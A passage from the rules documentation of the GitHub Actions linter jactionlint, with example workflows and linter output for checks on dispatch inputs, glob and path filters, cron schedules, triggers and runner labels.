[Playground](https://jactionlint.jdx.dev/#eNqMkcFOwzAMhu97Cmvi2j5Ar5y5cUMIOa3XmrZ2VTsd07R3R+0CEwpM3KzPn538iUq1Azjq3B8GPb41bBN63a0QgGWKbtcagJuvCsBPE1Xg9OEJ9SxZu+6Ua0pQcKS7AoBOzip2swAKeMYRf4An7m8jDR0wDl7BY6eBEx7JDNvsNPOZpU1woTmoZU5QHQgl338iS/CXzRLHQHM+5ESy271r2DI5mV8n5yhWqFQQQxSPxYBrb2uZ0/T9AsVqVkB1p7B/OJ/Th5QjbgHhctn/ZZIsL8lOUV//qWN7X23ZuxhKWki8zC/0OQCbKqYK)

[`workflow_dispatch`](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_dispatch) starts a workflow manually. The event can have parameters called inputs. Each input has a name, a description, a default value and an [input type](https://github.blog/changelog/2021-11-10-github-actions-input-types-for-manual-workflows/).

The output also has findings of other rules: `workflow-syntax` for the unknown input type, `undefined-property` for `inputs.massage` and `github.event.inputs.massage`, `expression-type` for a boolean or a number used as an object key, and `template-injection` for an input that is expanded in a `run:` script (see [Inputs, payloads, release names and branch names](#check-template-injection-inputs)).

**What is reported.**

- An input type that is not one of `string`, `number`, `boolean`, `choice` and `environment` (reported as `workflow-syntax`).
- A `choice` input without `options:`.
- A default value of a `choice` input that is not one of its options.
- A default value of a `boolean` input that is not `true` or `false`.
- A default value of a `number` input that cannot be parsed as a number.
- More than 25 inputs in the event.

#### Typing of the inputs of workflow_dispatch

`github.event.inputs` and `inputs` are typed from the input definitions, so a property that `inputs:` does not define is reported (`undefined-property`). For example, these inputs:

```yaml
inputs:
  string_input:
    type: string
  choice_input:
    type: choice
    options: ['hello']
  bool_input:
    type: boolean
  num_input:
    type: number
  env_input:
    type: environment
  no_type_input:
```

`inputs` is typed as follows from these definitions:

```
{
  "string_input": string;
  "choice_input": string;
  "bool_input": bool;
  "num_input": number;
  "env_input": string;
  "no_type_input": any;
}
```

`github.event.inputs` is typed as follows because all of its properties are strings, unlike those of `inputs`:

```
{
  "string_input": string;
  "choice_input": string;
  "bool_input": string;
  "num_input": string;
  "env_input": string;
  "no_type_input": string;
}
```

The listings show the types in a long form. A finding prints a type as `{age: number; id: any}`, with the properties sorted by name.

**Related.** [Unused workflow inputs (pedantic)](#check-unused-workflow-input) reports an input that nothing reads.

<a id="check-glob-pattern"></a>
## Glob filter pattern syntax validation

The rule `invalid-glob` reports a filter pattern of `branches`, `branches-ignore`, `tags`, `tags-ignore`, `paths` or `paths-ignore` that GitHub cannot use: a glob with a syntax error, a character that a Git ref name cannot contain, or a path that starts with `.` or `..`.

Example input:

```yaml
on:
  push:
    branches:
      # ^ is not available for branch name. This kind of mistake is usually caused by misunderstanding
      # that regular expression is available here
      - '^foo-'
    tags:
      # Invalid syntax. + cannot follow special character *
      - 'v*+'
      # Invalid character range 9-1
      - 'v[9-1]'
    paths:
      # GitHub Action's path filter doesn't recognize '.'
      - ./foo/bar.txt

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo ...
```

Output:

```
test.yaml:6:10: character '^' is invalid for branch and tag names. ref name cannot contain spaces, ~, ^, :, [, ?, *. see `man git-check-ref-format` for more details. note that regular expression is unavailable. note: filter pattern syntax is explained at https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet [invalid-glob]
  |
6 |       - '^foo-'
  |          ^~~~~~
test.yaml:9:12: invalid glob pattern. unexpected character '+' while checking special character + (one or more). the preceding character must not be special character. note: filter pattern syntax is explained at https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet [invalid-glob]
  |
9 |       - 'v*+'
  |            ^~
test.yaml:11:14: invalid glob pattern. unexpected character '1' while checking character range in []. start of range '9' (57) is larger than end of range '1' (49). note: filter pattern syntax is explained at https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet [invalid-glob]
   |
11 |       - 'v[9-1]'
   |              ^~~
test.yaml:14:9: '.' and '..' are not allowed in glob path. note: filter pattern syntax is explained at https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet [invalid-glob]
   |
14 |       - ./foo/bar.txt
   |         ^~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpMjMGqAyEMRfd+xd0J76FDl/VXSgs6OJVSEtGk9PPL6MZVODmHyxQMULWX8wKpRdpL7pMAB/s4mJ0dLPG5ms/fv13odnWX+3zUKGUp/XYwbyk2L18x5sVpSMldZtSUumMK0KQk6t7xdEN1yXWZakoBeS8M7/1vADXfMEo=)

For filtering branches, tags and paths in webhook events, the [glob syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet) is available. jactionlint validates the patterns of `branches:`, `branches-ignore:`, `tags:`, `tags-ignore:`, `paths:` and `paths-ignore:` in a workflow. It reports:

- invalid syntax, such as a missing closing bracket of a character range `[..]`
- invalid usage, such as `?` following `*` or the invalid character range `[9-1]`
- characters that a Git ref name (a branch name or a tag name) cannot contain, such as `[`, `:` and `\`, and a ref name that starts or ends with `/`
- a path that is `.` or `..`, or that starts with `./` or `../` (also after a leading `!`), because the path filter does not recognize `.`; a `.` or `..` in the middle of a path is not reported
- a path with a space at the start or at the end

The most common mistake is a regular expression such as `^foo-`: filters are globs, not regular expressions, and the message says so.

**Related.** [Path filters that match no file (pedantic)](#check-unmatched-paths-filter) reports a valid `paths` entry that matches no file.

<a id="check-unmatched-paths-filter"></a>
## Path filters that match no file (pedantic)

The rule `unmatched-paths-filter` (in the `pedantic` profile, at the level `warn`) reports an entry of `paths` or `paths-ignore` that matches no file or directory of the repository, so the entry never triggers the workflow or ignores nothing.

Example input:

```yaml
# select: unmatched-paths-filter
on:
  push:
    paths:
      - 'src/**'
      - 'source/**'
  pull_request:
    paths-ignore:
      - 'docs/**'
      - 'doc/**'
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - run: echo test
```

Example file: src/main.go

```go
package main
```

Example file: docs/index.md

```markdown
# Docs
```

Example config:

```yaml
rules:
  unmatched-paths-filter: warn
```

Output:

```
test.yaml:6:9: warning: the entry "source/**" of "paths" matches no file or directory of the repository, so it never triggers the workflow. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
  |
6 |       - 'source/**'
  |         ^~~~~~~~~~~
test.yaml:10:9: warning: the entry "doc/**" of "paths-ignore" matches no file or directory of the repository, so it ignores nothing. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
   |
10 |       - 'doc/**'
   |         ^~~~~~~~
```

<!-- Skip playground link -->

The example is linted in a repository that has the directories `src` and `docs`, and not `source` and `doc`: the files of the example are the two blocks that start with `Example file:`. The output keeps only this rule: `jactionlint --select unmatched-paths-filter` prints it in such a repository. In the default profile the rule is off, and the entry `unmatched-paths-filter: warn` under `rules` of the [configuration file](config.md#rules) turns it on at the level `warn` (the profile `pedantic` turns it on too).

GitHub starts a workflow for a push or a pull request only when a changed file matches an entry of `paths`. When a directory is renamed or moved, or an entry has a typo (`.yml` for `.yaml`), the entry matches nothing, the workflow does not start for the files it was written for and nothing says so. The rule matches every entry of `paths` and `paths-ignore` of `push`, `pull_request` and `pull_request_target` against the files of the repository and reports the entries that match none.

#### Which files the paths are matched against

The rule matches the files that `git ls-files` lists in the project: the tracked files and the untracked files that are not ignored, so `node_modules` is not a file of the repository. When git cannot say, it matches the files of the working tree without `.git`, `node_modules`, `.venv` and `venv`. It reports nothing for `-` (stdin) or for a workflow that is not in a repository.

**What is not reported.** The rule is careful about what it calls a mismatch, because it cannot know what GitHub does in a few cases:

- An entry matches when it matches a file or a directory (GitHub does not document whether `docs` alone matches the files in it). A `/` at the end is ignored, and the case of letters is not compared.
- An entry that starts with `!`, contains `${{ }}`, starts with `/` or `./`, is an invalid pattern (see [Glob filter pattern syntax validation](#check-glob-pattern)) or has a negated character class is skipped.
- A submodule without files in the list (git lists a submodule as one path) hides the entries that could match inside it: one that names a path in it, or whose wildcard can reach into it (`**/*.js`, `vendor/**`). An entry that cannot reach into a subdirectory (`*.md`) is decided by the files of the repository itself.
- When git lists no file, or more than 300000, the rule says nothing, and it does not walk the tree then. The same limit applies to a walk: a working tree with more than 300000 files is not looked at.
- A generated file is skipped, because its entries come from another file, unless `generated-files: report` is set.

**Fix.** Correct the path in the entry or remove the entry. The rule cannot know the right path.

**Configure.** `generated-files` is a key of the [configuration file](config.md#configuration-file), not an option of the rule.

<a id="check-cron-syntax-and-timezone"></a>
## CRON syntax and IANA timezone string at `on.schedule`

The rules `invalid-cron`, `cron-too-frequent` and `invalid-timezone` report a `schedule` trigger that GitHub cannot run as written: a cron expression that is not valid, a job that would run more often than once every 5 minutes, and a `timezone` that is not an IANA timezone name.

Example input:

```yaml
on:
  schedule:
    # ERROR: Cron syntax is not correct
    - cron: '0 */3 * *'
    # ERROR: Interval of scheduled job is too small (job runs too frequently)
    - cron: '* */3 * * *'
    # ERROR: Timezone is not a valid IANA timezone string
    - cron: '*/5 * * * *'
      timezone: 'Asia/Somewhere'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo ...
```

Output:

```
test.yaml:4:13: invalid CRON format "0 */3 * *" in schedule event: expected exactly 5 fields, found 4: [0 */3 * *] [invalid-cron]
  |
4 |     - cron: '0 */3 * *'
  |             ^~
test.yaml:6:13: scheduled job runs too frequently. it runs once per 60 seconds. the shortest interval is once every 5 minutes [cron-too-frequent]
  |
6 |     - cron: '* */3 * * *'
  |             ^~
test.yaml:9:17: invalid timezone "Asia/Somewhere" in schedule event. it must be a valid IANA timezone name [invalid-timezone]
  |
9 |       timezone: 'Asia/Somewhere'
  |                 ^~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpkzU0KAjEMBeB9T/F2hUJbQdxk5xk8wUwNdGSmkaZF8PRSf0BxF94X3pNCBtCU+dxXHjfgkaoUgt3BxT0cnP3N3Sf/l3iA+xagLRvfpTDBHnWZ4kk2vmWubI25yKxkgMbaXtu1F/Wjqs+9tO7XadiTtPFV6d3qxyeBUxaEEB4DAMYnMuQ=)

A [scheduled event](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#scheduled-events) starts a workflow at the times of a [POSIX cron expression](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/crontab.html#tag_20_25_07). jactionlint checks the syntax of the expression (`invalid-cron`) and how often the job runs (`cron-too-frequent`). [The official documentation](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#scheduled-events) says:

> The shortest interval you can run scheduled workflows is once every 5 minutes.

`timezone` must be [a valid IANA timezone name](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#onschedule) (`invalid-timezone`). A name that holds an expression, such as `${{ vars.TZ }}`, is reported too. An entry of `schedule` without `cron` is reported as `workflow-syntax`, because an entry with only a `timezone` does not schedule anything.

<a id="check-workflow-run-names"></a>
## Workflow names of `workflow_run` event

The rule `workflow-run-names` reports a name in `on.workflow_run.workflows` that no workflow of the repository has.

Example input:

```yaml
on:
  workflow_run:
    # ERROR: No workflow named "Biuld" exists in the repository
    workflows: [Biuld]
    types: [completed]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
```

Output:
```
test.yaml:4:17: workflow "Biuld" specified at "workflows" of "workflow_run" event is not found in the repository. a workflow is specified by its "name:" or its file path when it has no name [workflow-run-names]
  |
4 |     workflows: [Biuld]
  |                 ^~~~~
```

<!-- Skip playground link -->

Each name is compared, without regard to case, with the `name:` of every workflow file in `.github/workflows`, or with the file path of a workflow that has no `name:`. A name that contains `${{ }}` or glob characters is skipped, and so is the whole check when a workflow file cannot be parsed or has a dynamic `name:`.

**Fix.** Correct the name, or add the `name:` to the workflow that the event is meant for.

<a id="check-duplicate-triggers"></a>
## Duplicate triggers

The rule `duplicate-triggers` (policy group, in the `default` profile) reports a workflow that `push` and `pull_request` both start for the same commit, because `push` has no branch filter.

Example input:

```yaml
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - run: echo test
```

Example config:

```yaml
rules:
  duplicate-triggers: warn
```

Output:

```
test.yaml:1:6: warning: "push" has no branch filter and "pull_request" is used too, so a commit pushed to a branch of this repository that has a pull request runs the workflow twice. limit "push" to the branches that need it, for example the default branch [duplicate-triggers]
  |
1 | on: [push, pull_request]
  |      ^~~~~
```

<!-- Skip playground link -->

The output of the example is at the level `warn`, which this entry of the [configuration file](config.md#rules) sets. The default level is `error`, and the finding then has no `warning:` prefix. The example runs with a shared example configuration, and the output keeps only this rule: with the entry in your configuration file, `jactionlint --select duplicate-triggers` prints it.

A commit that is pushed to a branch of the repository that has a pull request starts the workflow twice, once for each event, and both runs say the same thing.

**Fix.** Limit `push` to the branches that need it:

```yaml
on:
  push:
    branches: [main]
  pull_request:
```

The rule has no automatic fix, because it cannot know the right branches.

**What is reported.** `push` counts as unfiltered when it has no `branches`, or when `branches` lists `**` (also next to other entries, or with exceptions such as `!release/**`). A `branches-ignore`, `paths` or `tags-ignore` filter does not make it filtered, because a commit of any other branch still starts the workflow. A `push` with only `tags` does not run for branches.

**What is not reported.**

- A `pull_request` with only `types` that do not carry new commits, for example `closed`.
- A workflow where every job has an `if:` on `github.event_name` or on `github.event.pull_request.head.repo`.
- A workflow where the group of the `concurrency` has `github.head_ref` and `github.ref_name` and cancels runs.

The `if:` and the `concurrency` group are the two common ways to run the workflow once.

<a id="check-event-name-never-received"></a>
## Events that the workflow never receives (pedantic)

The rule `event-name-never-received` (in the `pedantic` profile, at the level `warn`) reports a comparison of `github.event_name` with an event that the workflow never receives, so the comparison is always false.

Example input:

```yaml
on:
  push:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the workflow is not run by pull_request
      - run: echo "review"
        if: github.event_name == 'pull_request'
      # ERROR: a run has one event
      - run: echo "both"
        if: ${{ github.event_name == 'push' && github.event_name == 'workflow_dispatch' }}
      # OK: push is one of the events
      - run: echo "deploy"
        if: github.event_name == 'push'
```

Example config:

```yaml
rules:
  event-name-never-received: warn
```

Output:

```
test.yaml:11:13: warning: "github.event_name == 'pull_request'" is always false: this workflow is never run by the event "pull_request", it runs on push, workflow_dispatch [event-name-never-received]
   |
11 |         if: github.event_name == 'pull_request'
   |             ^~~~~~~~~~~~~~~~~
test.yaml:14:48: warning: "github.event_name == 'workflow_dispatch'" is always false here: the same condition needs the event to be "push" as well, and a run has one event [event-name-never-received]
   |
14 |         if: ${{ github.event_name == 'push' && github.event_name == 'workflow_dispatch' }}
   |                                                ^~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The example enables the rule with this entry of the [configuration file](config.md#rules), which is how to turn it on in the default profile (the profile `pedantic` turns it on too). The example runs with a shared example configuration, and the output keeps only this rule: `jactionlint --select event-name-never-received` prints it as well.

A run of a workflow has one event, and `github.event_name` is its name. When the workflow lists the events it runs on and never lists `pull_request`, the comparison `github.event_name == 'pull_request'` is always false: the step or the job never runs, or the comparison is a dead branch of a larger condition. It is a typo in the name, a trigger that was removed, or a condition copied from another workflow. Two comparisons with different events in one `&&` chain cannot both be true either. The rule reports them in every expression of the workflow, in `if:` conditions with or without `${{ }}` too.

**What is not reported.** The names are compared without regard to case, as GitHub compares strings. The rule does not look at a workflow with `workflow_call` (the event of its run is the one of the caller), at a composite action, or at `!=`, `contains()` and other ways to test the event.

The rule is in the `pedantic` profile because the dead code it finds is harmless and is sometimes there on purpose: a file that is a template for generated workflows, with the same `if:` or `concurrency:` in every generated file, a generated workflow with the conditions for every event, and a condition that was left after a trigger was removed.

<a id="check-runner-labels"></a>
## Runner labels

The rules `unknown-runner-label` and `conflicting-runner-labels` check the labels at `runs-on:`: a label that no GitHub-hosted runner has (or that GitHub has retired), and a combination of labels that no runner can have. Both are in the `correctness` profile, so they run in every profile. The rule `invalid-label-pattern` reports a pattern in `self-hosted-runner.labels` of the configuration file that is not a valid glob.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      matrix:
        runner:
          # OK
          - macos-latest
          # ERROR: Unknown runner
          - linux-latest
          # OK: Preset labels for self-hosted runner
          - [self-hosted, linux, x64]
          # OK: Single preset label for self-hosted runner
          - arm64
          # ERROR: Unknown label "gpu". Custom label must be defined in jactionlint.yaml config file
          - gpu
    runs-on: ${{ matrix.runner }}
    steps:
      - run: echo ...

  test2:
    # ERROR: Too old macOS worker
    runs-on: macos-10.13
    steps:
      - run: echo ...
```

Output:

```
test.yaml:10:13: label "linux-latest" is unknown. available labels are "windows-latest", "windows-latest-8-cores", "windows-2025", "windows-2025-vs2026", "windows-2022", "windows-11-arm", "windows-11-vs2026-arm", "ubuntu-slim", "ubuntu-latest", "ubuntu-latest-4-cores", "ubuntu-latest-8-cores", "ubuntu-latest-16-cores", "ubuntu-26.04", "ubuntu-26.04-arm", "ubuntu-24.04", "ubuntu-24.04-arm", "ubuntu-22.04", "ubuntu-22.04-arm", "macos-latest", "macos-latest-xlarge", "macos-latest-large", "macos-26-intel", "macos-26-xlarge", "macos-26-large", "macos-26", "macos-15-intel", "macos-15-xlarge", "macos-15-large", "macos-15", "macos-14-xlarge", "macos-14-large", "macos-14", "xcode-27", "xcode-27-xlarge", "self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows". if it is a custom label for self-hosted runner, set list of labels in jactionlint.yaml config file [unknown-runner-label]
   |
10 |           - linux-latest
   |             ^~~~~~~~~~~~
test.yaml:16:13: label "gpu" is unknown. available labels are "windows-latest", "windows-latest-8-cores", "windows-2025", "windows-2025-vs2026", "windows-2022", "windows-11-arm", "windows-11-vs2026-arm", "ubuntu-slim", "ubuntu-latest", "ubuntu-latest-4-cores", "ubuntu-latest-8-cores", "ubuntu-latest-16-cores", "ubuntu-26.04", "ubuntu-26.04-arm", "ubuntu-24.04", "ubuntu-24.04-arm", "ubuntu-22.04", "ubuntu-22.04-arm", "macos-latest", "macos-latest-xlarge", "macos-latest-large", "macos-26-intel", "macos-26-xlarge", "macos-26-large", "macos-26", "macos-15-intel", "macos-15-xlarge", "macos-15-large", "macos-15", "macos-14-xlarge", "macos-14-large", "macos-14", "xcode-27", "xcode-27-xlarge", "self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows". if it is a custom label for self-hosted runner, set list of labels in jactionlint.yaml config file [unknown-runner-label]
   |
16 |           - gpu
   |             ^~~
test.yaml:23:14: label "macos-10.13" is unknown. available labels are "windows-latest", "windows-latest-8-cores", "windows-2025", "windows-2025-vs2026", "windows-2022", "windows-11-arm", "windows-11-vs2026-arm", "ubuntu-slim", "ubuntu-latest", "ubuntu-latest-4-cores", "ubuntu-latest-8-cores", "ubuntu-latest-16-cores", "ubuntu-26.04", "ubuntu-26.04-arm", "ubuntu-24.04", "ubuntu-24.04-arm", "ubuntu-22.04", "ubuntu-22.04-arm", "macos-latest", "macos-latest-xlarge", "macos-latest-large", "macos-26-intel", "macos-26-xlarge", "macos-26-large", "macos-26", "macos-15-intel", "macos-15-xlarge", "macos-15-large", "macos-15", "macos-14-xlarge", "macos-14-large", "macos-14", "xcode-27", "xcode-27-xlarge", "self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows". if it is a custom label for self-hosted runner, set list of labels in jactionlint.yaml config file [unknown-runner-label]
   |
23 |     runs-on: macos-10.13
   |              ^~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqEj8GqwyAQRfd+xV28ZZSXNmThr5QubGqTlESDo5AS8u9FNBSh0JVcZ+ZyjjUSS6CBPe2NJAO8Jh9fgLxTXvevlIBZeTeuRwJcMEa7TwY4ZtVZ4pOKLcVgGk1Yvw0upKcHHyx5fa/SWoW1ba7FlnJz2xQ//RJYpiAeLf62LSOKRIZ9zx56oQOTxwMJ3Q0WQgiWjU+yLEse9b+ozz873gMASPlVEA==)

A label that GitHub has retired leaves the list of available labels on the day of its retirement, so the list in your output can differ from the one shown.

**What is checked.** GitHub Actions has two kinds of job runners, [GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) and [self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners). Each runner has one or more labels, and GitHub Actions finds a runner for a job from the labels at `runs-on:`. When an expression is used, as in `runs-on: ${{ matrix.foo }}`, jactionlint parses the expression, resolves the possible values and validates each of them.

**Labels made of text and a matrix value.** A label that is a matrix value written together with text (`runs-on: ${{ matrix.os }}-latest`, `ubuntu-${{ matrix.version }}`) is resolved the same way: with `os: [macos, linux]` the labels are `macos-latest` and `linux-latest`, and the second one is reported at `linux` in the matrix. The label is resolved only when:

- it has one matrix name (`${{ matrix.os }}-${{ matrix.arch }}` is not resolved, because `exclude` and `include` decide which pairs run);
- the values are strings (a number such as `20.10`, which GitHub prints as `20.1`, is skipped);
- the job certainly has the value of the row.

jactionlint models the matrix as GitHub documents it. The base is the cross product of the rows, an `exclude` entry removes the combinations that have all of its pairs (so `{os: linux, node: 18}` leaves `linux` with `node: 20`), and `include` adds jobs afterwards, so a value that `include` names always has one. Wherever an expression makes the effect unknown (a value in an `exclude` entry, an entry or the whole `exclude`, a row of another key), the value is not reported.

**Custom labels of self-hosted runners.** jactionlint does not know the custom labels of your self-hosted runners. List them in `self-hosted-runner.labels` of the [configuration file](./config.md#runners). A job that has the label `self-hosted` runs on a runner of its owner, who chooses the other labels, so a label next to `self-hosted` is never reported as unknown (unless `self-hosted-runner.strict-labels` is on). A label made of a known GitHub-hosted label and the size of a larger runner (`ubuntu-latest-16-cores`, `ubuntu-24.04-xl`, `macos-15-xl`, `windows-2022-32cpu`) is accepted too. The names that an organization gives to its larger runners are custom labels: list them in the configuration file.

**Retired labels.** A label of an image that GitHub has retired (`macos-13`, `macos-12`, `ubuntu-20.04`, `windows-2019` and older) is unknown. The message says when GitHub retired the image and which labels to use instead, with the announcement. A job on such a label never gets a runner. A label that is still available but has a date for its retirement is reported by the pedantic rule [`deprecated-runner-label`](#check-deprecated-runner-label) until that day. On the day of the retirement `unknown-runner-label` reports it, with the same message as for the labels that went before it, whatever the version of jactionlint.

**Labels of runner services.** The labels of the services that host runners for GitHub Actions are accepted without configuration, so that a workflow that runs fine is not reported:

- Blacksmith: `blacksmith-*`
- Depot: `depot-ubuntu-*`, `depot-windows-*`, `depot-macos-*`
- Namespace: `namespace-profile-*`, `nscloud-*`, `namespace-features:*`
- RunsOn: `runs-on=...`, `runner=...`, `family=...`, `image=...`, `cpu=...`, `ram=...`, `spot=...`, `extras=...`, `pool=...`, `volume=...`, `retry=...`, `ami=...`, `sticky=...`
- Ubicloud: `ubicloud`, `ubicloud-arm`, `ubicloud-standard-*`, `ubicloud-premium-*`
- WarpBuild: `warp-*`

The prefixes are the ones that the documentation of each service names, and a label needs something after the prefix. These labels do not take part in the check of conflicting labels, since the label of a service says nothing about the operating system. BuildJet is not in the list, because the service was shut down. Set the labels of other services, or of a provider that you want to be reported, in `self-hosted-runner.labels`. `self-hosted-runner.providers` names the providers that are accepted (all of them when it is not set, none for `[]`), and `self-hosted-runner.strict-labels` accepts only the labels in `labels`. The keys are described in the [runners part of the configuration reference](./config.md#runners).

**Conflicting labels.** `runs-on:` can be an array that contains several labels. GitHub then selects a runner that has all the labels, and some combinations of labels conflict, so no runner can have them all.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: [ubuntu-latest, windows-latest]
    steps:
      - run: echo ...
```

Output:

```
test.yaml:4:30: label "windows-latest" conflicts with label "ubuntu-latest" defined at line 4, column 15. note: to run your job on each workers, use matrix [conflicting-runner-labels]
  |
4 |     runs-on: [ubuntu-latest, windows-latest]
  |                              ^~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNosi0EKgDAMBO99xT7A9gH9iniwWqgiSTEJ/b5EPS3LzDBldJMWTi6SA6BV1Be4jSQ6n60YqcVrdThhHLTzkP8vryxau3wdEL3NqFtjpJSeAQBe4h8M)

**Fix.** In most cases a conflict is a misunderstanding: a matrix combination cannot be written at `runs-on:` directly. Use `matrix:` and expand it with `${{ }}` at `runs-on:` to run the workflow on several runners. For an unknown label, use one of the labels that the message lists, or list your own label in `self-hosted-runner.labels`.

The `-latest` labels follow the image that GitHub points them to. `windows-latest` agrees with `windows-2025` and `windows-2025-vs2026` and conflicts with `windows-2022`, and `macos-latest` agrees with `macos-26` and conflicts with `macos-15`. `ubuntu-latest` agrees with `ubuntu-24.04` and with `ubuntu-26.04`, because GitHub moves the label from the first image to the second in a rollout, and a job can run on either image meanwhile.

**Related.** [Mutable runner labels](#check-mutable-runner-label), [deprecated runner labels](#check-deprecated-runner-label) and [self-hosted runners](#check-self-hosted-runner) are separate pedantic rules about the same labels.

<a id="check-ubuntu-slim-limits"></a>
## Limits of ubuntu-slim

The rule `ubuntu-slim-limits` (in the `default` profile, level `error`) reports a job on the single-CPU runner `ubuntu-slim` that uses something this runner cannot run: a job `container:`, the `services:` of the job or a Docker container action. With the option `pedantic` it also reports a `timeout-minutes` that is longer than the 15 minutes the runner allows.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-slim
    container: node:22
    services:
      redis:
        image: redis
    steps:
      - uses: docker://alpine:3.22
```

Output:

```
test.yaml:5:5: "container" cannot be used on ubuntu-slim: ubuntu-slim runs the job inside an unprivileged container, which has no Docker daemon, so the job container cannot start. use a runner with a VM such as ubuntu-latest [ubuntu-slim-limits]
  |
5 |     container: node:22
  |     ^~~~~~~~~~
test.yaml:7:7: "services" cannot be used on ubuntu-slim: ubuntu-slim runs the job inside an unprivileged container, which has no Docker daemon, so the service containers cannot start. use a runner with a VM such as ubuntu-latest [ubuntu-slim-limits]
  |
7 |       redis:
  |       ^~~~~~
test.yaml:10:15: the Docker container action "docker://alpine:3.22" cannot run on ubuntu-slim: ubuntu-slim runs the job inside an unprivileged container, which has no Docker daemon. use a runner with a VM such as ubuntu-latest [ubuntu-slim-limits]
   |
10 |       - uses: docker://alpine:3.22
   |               ^~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Why.** `ubuntu-slim` runs a job inside an unprivileged container instead of a virtual machine. GitHub [documents](https://docs.github.com/en/actions/reference/runners/github-hosted-runners#single-cpu-runners) that Docker-in-Docker is not supported there, and the image has a Docker client but no daemon. The request to add Docker to the runner is [actions/runner-images#13541](https://github.com/actions/runner-images/issues/13541).

**What is reported.** Each of these cannot work on the runner:

- the job `container:`;
- the `services:` of the job;
- a Docker container action: a step with `uses: docker://...`, a local action whose `runs.using` is `docker`, or a local composite action that has such a step, at any depth of local composite actions that call each other.

A `run:` step that calls `docker` is not reported.

**What is not reported.** The rule reports a job whose `runs-on` is only `ubuntu-slim`: the label itself, or a matrix whose values are all `ubuntu-slim`. A job that may also get another runner is never reported: a second label, a matrix with another value, a matrix or a runner that comes from an expression, `self-hosted` and a runner group. Remote actions whose `action.yml` declares `runs.using: docker` are not known without the [online checks](./online.md#online-checks) and are not reported.

**The option `pedantic`.** With the option `pedantic` (see [profiles](./config.md#profiles)) the rule adds the job timeout. GitHub documents a job timeout of 15 minutes for single-CPU runners, so a `timeout-minutes` greater than 15 never takes effect, and a job that runs longer fails at 15 minutes. This part is pedantic because it reports a setting that does nothing, not a failing job, until a job really runs that long. A `timeout-minutes` that is an expression is not reported.

**Fix.** There is no automatic fix: the right change (a runner that has a virtual machine, or no container) is a decision of the author. The fix of [`missing-timeout`](#check-timeout-minutes) does not write more than 15 on such a job, so that it does not add a finding of this rule.

<a id="check-mutable-runner-label"></a>
## Mutable runner labels (pedantic)

The rule `mutable-runner-label` (in the `pedantic` profile, level `warn`) reports the labels of GitHub-hosted runners that GitHub moves to a newer image over time: `ubuntu-latest`, `windows-latest`, `macos-latest` and their sized variants. A job on such a label can start to fail on the day GitHub switches the image, without any change in the repository.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
```

Example config:

```yaml
rules:
  mutable-runner-label: warn
```

Output:

```
test.yaml:4:14: warning: runner label "ubuntu-latest" is an alias that GitHub moves to newer images, so the job can break without a change in this repository. use a fixed label such as "ubuntu-24.04", the image it points to until GitHub moves it to "ubuntu-26.04" in a rollout from 2026-10-19 to 2026-11-19 [mutable-runner-label]
  |
4 |     runs-on: ubuntu-latest
  |              ^~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=mutable-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is reported.** The rule reads `runs-on` and the values of `matrix.<key>` that `runs-on: ${{ matrix.<key> }}` selects. The message names the fixed label that the alias points to, according to the label table of jactionlint, and says when GitHub has announced a move of the alias to a newer image. The [conflicting labels](#check-runner-labels) check accepts both images next to such an alias.

**What is not reported.** Jobs with `self-hosted` among the labels, and labels that other expressions give.

**Fix.** The fix is only offered when you decide the replacement, because jactionlint does not know which image you want. Configure it with the `pin` option. The finding of a label with an entry then has a fix, which `jactionlint --fix` applies by writing the fixed label in its place:

```yaml
rules:
  mutable-runner-label:
    pin:
      ubuntu-latest: ubuntu-24.04
      macos-latest: macos-26
```

A label in a matrix is reported but never fixed, because the same value may be compared in an expression of the job.

<a id="check-deprecated-runner-label"></a>
## Deprecated runner labels (pedantic)

The rule `deprecated-runner-label` (in the `pedantic` profile, level `warn`) reports a label of a GitHub-hosted runner that GitHub has announced to retire but that still works. The message has the date of the retirement, the labels to move to and the announcement.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: macos-14
    steps:
      - run: echo test
```

Example config:

```yaml
rules:
